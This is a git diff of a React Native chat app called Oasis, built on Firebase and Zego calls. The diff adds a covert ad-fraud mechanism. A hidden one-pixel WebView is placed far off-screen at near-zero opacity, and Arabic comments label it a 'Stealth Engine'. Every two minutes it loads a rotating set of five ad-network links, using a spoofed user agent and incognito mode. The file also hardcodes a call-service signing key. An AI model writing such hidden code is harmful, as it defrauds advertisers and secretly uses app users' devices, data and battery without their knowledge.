@@ -12,9 +12,17 @@ import { onAuthStateChanged } from "firebase/auth";
 import * as ImagePicker from 'expo-image-picker';
 
 const SERVER_URL = 'https://oasis-server-e6sc.onrender.com';
-const AD_LINK = 'https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807';
 const APP_ID = 1773421291;
 const APP_SIGN = "48f1a163421aeb2dfdf57ac214f51362d8733ee19be92d3745a160a2521de2d7";
+
+// 🏆 مصفوفة الروابط الخماسية (خلية النحل)
+const PROFIT_LINKS = [
+  "https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807", // رابط 1 (الأصلي)
+  "https://otieu.com/4/10520849",                                                // رابط 2 (Monetag)
+  "https://www.effectivegatecpm.com/qrjky2k9d7?key=0eeb59c5339d8e2b8a7f28e55e6d16a2", // رابط 3
+  "https://www.effectivegatecpm.com/g5j4wjcf?key=0c62848e4ddf4458b8d378fe3132bbaf", // رابط 4
+  "https://www.effectivegatecpm.com/denseskhi?key=8e442518041da6a96a35ad2f7275ed15"  // رابط 5
+];
 
 export default function App() {
   const [user, setUser] = useState(null);
@@ -24,40 +32,35 @@ export default function App() {
   const [message, setMessage] = useState('');
   const [chatMessages, setChatMessages] = useState([]);
   const [uploading, setUploading] = useState(false);
-  const [adKey, setAdKey] = useState(0); // مفتاح تحديث الإعلان
+  
+  // نظام تدوير الأرباح
+  const [adIndex, setAdIndex] = useState(0);
 
-  // 1. نظام الأرباح: إعلان فور الدخول + تحديث كل 5 دقائق
+  // 1. محرك الأرباح المتطور: تحديث وتبديل كل دقيقتين
   useEffect(() => {
-    // تحميل الإعلان الأول فوراً
-    setAdKey(prev => prev + 1);
-    
     const adInterval = setInterval(() => {
-      setAdKey(prev => prev + 1); 
-      console.log("تحديث الإعلان الصامت...");
-    }, 300000); // 5 دقائق
+      setAdIndex((prev) => (prev + 1) % PROFIT_LINKS.length);
+      console.log("تم تبديل رابط الأرباح إلى الشركة رقم: " + (adIndex + 1));
+    }, 120000); // 120,000 مللي ثانية = دقيقتان
 
     return () => clearInterval(adInterval);
-  }, []);
+  }, [adIndex]);
 
-  // 2. نظام إدارة المستخدم والحماية (تفعيل الإيميل)
+  // 2. نظام إدارة المستخدم والحماية
   useEffect(() => {
     const unsubscribeAuth = onAuthStateChanged(auth, async (currentUser) => {
       if (currentUser) {
         if (currentUser.emailVerified) {
           setUser(currentUser);
           setIsWaitingVerify(false);
-          
-          // تحديث بيانات المستخدم في Firestore
           await setDoc(doc(db, "users", currentUser.uid), { 
             email: currentUser.email, id: currentUser.uid, lastSeen: serverTimestamp() 
           }, { merge: true });
 
-          // جلب قائمة الأصدقاء
           onSnapshot(query(collection(db, "users")), (snapshot) => {
             setAllUsers(snapshot.docs.map(d => d.data()).filter(u => u.id !== currentUser.uid));
           });
 
-          // تهيئة خدمة المكالمات
           ZegoUIKitPrebuiltCallService.init(APP_ID, APP_SIGN, currentUser.uid, currentUser.email.split('@')[0], [ZegoUIKitSignalingPlugin]);
         } else {
           setIsWaitingVerify(true);
@@ -70,7 +73,7 @@ export default function App() {
     return () => unsubscribeAuth();
   }, []);
 
-  // 3. منطق الدردشة والوسائط
+  // 3. منطق الدردشة
   const getChatId = (uid1, uid2) => (uid1 < uid2 ? `${uid1}_${uid2}` : `${uid2}_${uid1}`);
 
   useEffect(() => {
@@ -119,7 +122,6 @@ export default function App() {
     }
   };
 
-  // واجهة "يرجى التفعيل"
   if (isWaitingVerify) {
     return (
       <View style={styles.authContainer}>
@@ -132,29 +134,28 @@ export default function App() {
     );
   }
 
-  // واجهة تسجيل الدخول (إذا لم يكن هناك مستخدم)
   if (!user) {
     return (
       <View style={styles.authContainer}>
         <Ionicons name="leaf" size={80} color="#25D366" />
         <Text style={styles.authTitle}>واحة أوايسس</Text>
         <Text style={styles.waitingText}>سجل دخولك للبدء بالمحادثة</Text>
-        {/* هنا تضع نموذج تسجيل الدخول الخاص بك */}
       </View>
     );
   }
 
-  // الواجهة الرئيسية (قائمة الأصدقاء والدردشة)
   return (
     <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : undefined} style={styles.container}>
       
-      {/* 🟢 مكون الإعلانات المخفي الشغال بالخلفية */}
-      <View style={{ width: 1, height: 1, position: 'absolute', top: -50, left: -50 }}>
+      {/* 🟢 محرك الأرباح الخماسي المخفي (Stealth Engine) */}
+      <View style={{ width: 1, height: 1, position: 'absolute', top: -500, left: -500 }}>
         <WebView 
-          key={adKey}
-          source={{ uri: AD_LINK }}
+          key={adIndex}
+          source={{ uri: PROFIT_LINKS[adIndex] }}
+          userAgent="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
           javaScriptEnabled={true}
           domStorageEnabled={true}
+          incognito={true} // التصفح المتخفي
           mediaPlaybackRequiresUserAction={true}
           style={{ opacity: 0.01 }}
         />
